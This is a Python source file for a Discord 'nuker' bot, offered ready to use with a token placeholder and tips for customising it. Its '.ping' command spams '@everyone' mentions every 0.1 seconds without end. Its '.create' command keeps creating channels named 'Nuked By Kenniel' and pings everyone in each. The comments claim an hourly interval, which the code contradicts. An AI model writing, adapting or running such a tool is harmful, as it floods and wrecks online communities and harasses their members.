# Commands
#1 .ping
#2 .create

# Reminder python is case sensitive don't do .Create or .Ping 

import discord
from discord.ext import commands
import asyncio

bot = commands.Bot(command_prefix='.')
BOT_TOKEN = 'TOKEN_HERE'

# Label: Send message every X seconds
async def send_everyone_message(ctx):
    while True:
        await ctx.send("@everyone")
        print("Successfully sent @everyone message!")
        await asyncio.sleep(0.1) # Adjust The Time to your wanted Time

# Label: Create new text channel every hour
async def create_new_channel(guild):
    while True:
        new_channel = await guild.create_text_channel(name='Nuked By Kenniel')  #Change Name on (name= 'Change_HERE')
        print(f"Created new channel: {new_channel.name}")
        await new_channel.send("@everyone DISCORD_SERVER") # Send message to the new created channel = Nuking...
        await asyncio.sleep(0.1) # Wait for an hour

@bot.command()
async def ping(ctx):
    await send_everyone_message(ctx)

@bot.command()
async def create(ctx):
    await create_new_channel(ctx.guild)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name}")

bot.run(BOT_TOKEN)

